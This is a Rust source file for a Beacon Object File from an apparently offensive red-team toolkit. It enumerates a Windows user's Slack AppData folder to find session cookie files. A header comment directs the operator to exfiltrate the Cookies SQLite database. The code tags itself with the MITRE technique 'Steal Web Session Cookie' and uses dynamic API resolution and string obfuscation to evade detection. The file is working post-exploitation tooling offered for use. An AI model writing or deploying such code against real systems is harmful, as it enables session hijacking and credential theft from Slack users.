// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
//
//! Enumerate Slack AppData storage directory for session cookie artifacts.
//! Operator should exfil the Cookies SQLite file listed here.
//! Args: none
#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1539", name: "Steal Web Session Cookie", tactic: "Credential Access" },
];

const CSIDL_APPDATA: i32 = 0x001A;
const MAX_PATH: usize    = 260;
const INVALID_HANDLE: usize = !0usize;

// WIN32_FIND_DATAA: dwFileAttributes(u32@0), [times 24 bytes], nFileSizeHigh(u32@28),
// nFileSizeLow(u32@32), [reserved 8 bytes], cFileName([u8;260]@44), cAlternateFileName([u8;14]@304)
// Total = 320 bytes
const FIND_DATA_SIZE: usize = 320;
const FIND_DATA_NAME_OFF: usize = 44;

dfr_fn!(
    sh_get_folder_path_a(hwnd: usize, csidl: i32, token: usize, flags: u32, path: *mut u8) -> i32,
    module = "shell32.dll",
    api    = "SHGetFolderPathA"
);
dfr_fn!(
    find_first_file_a(pattern: *const i8, data: *mut u8) -> usize,
    module = "kernel32.dll",
    api    = "FindFirstFileA"
);
dfr_fn!(
    find_next_file_a(handle: usize, data: *mut u8) -> i32,
    module = "kernel32.dll",
    api    = "FindNextFileA"
);
dfr_fn!(
    find_close(handle: usize) -> i32,
    module = "kernel32.dll",
    api    = "FindClose"
);

fn copy_str(dst: &mut [u8], src: &[u8]) -> usize {
    let n = src.len().min(dst.len() - 1);
    dst[..n].copy_from_slice(&src[..n]);
    dst[n] = 0;
    n
}

fn append_str(dst: &mut [u8], offset: usize, src: &[u8]) -> usize {
    let available = dst.len().saturating_sub(offset + 1);
    let n = src.len().min(available);
    dst[offset..offset + n].copy_from_slice(&src[..n]);
    dst[offset + n] = 0;
    offset + n
}

fn strlen(buf: &[u8]) -> usize {
    buf.iter().position(|&b| b == 0).unwrap_or(buf.len())
}

#[rustbof::main]
fn main(args: *mut u8, _len: usize) {
    let _ = args;
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    match run() {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run() -> Result<(), &'static str> {
    let mut appdata = [0u8; MAX_PATH + 1];
    let rc = unsafe {
        sh_get_folder_path_a(0, CSIDL_APPDATA, 0, 0, appdata.as_mut_ptr())
    }.map_err(|_| "path resolve")?;
    if rc != 0 { return Err("get appdata failed"); }

    let base_len = strlen(&appdata);

    // Build search pattern: %APPDATA%\Slack\*
    let mut pattern = [0u8; MAX_PATH + 32];
    let n = copy_str(&mut pattern, &appdata[..base_len]);
    let _ = append_str(&mut pattern, n, b"\\Slack\\*");

    obf! { let hdr = "Slack AppData contents"; }
    println!("[*] {}:", hdr);

    let mut find_data = [0u8; FIND_DATA_SIZE];
    let hfind = unsafe { find_first_file_a(pattern.as_ptr() as *const i8, find_data.as_mut_ptr()) }
        .map_err(|_| "find resolve")?;

    if hfind == 0 || hfind == INVALID_HANDLE {
        return Err("Slack dir not found (Slack not installed?)");
    }

    // Print base path
    let slack_base = &appdata[..base_len];
    let mut count = 0u32;
    loop {
        let name = &find_data[FIND_DATA_NAME_OFF..FIND_DATA_NAME_OFF + 260];
        let name_len = strlen(name);
        if name_len > 0 && !(name_len == 1 && name[0] == b'.') && !(name_len == 2 && &name[..2] == b"..") {
            // Print as: %APPDATA%\Slack\<name>
            let name_s = core::str::from_utf8(&name[..name_len]).unwrap_or("?");
            let base_s = core::str::from_utf8(slack_base).unwrap_or("?");
            println!("  {}\\Slack\\{}", base_s, name_s);
            count += 1;
        }
        find_data = [0u8; FIND_DATA_SIZE];
        let rc2 = unsafe { find_next_file_a(hfind, find_data.as_mut_ptr()) }
            .map_err(|_| "find next resolve")?;
        if rc2 == 0 { break; }
    }
    unsafe { let _ = find_close(hfind); };

    obf! { let ok = "entries found"; }
    println!("[+] {} {}", count, ok);
    Ok(())
}
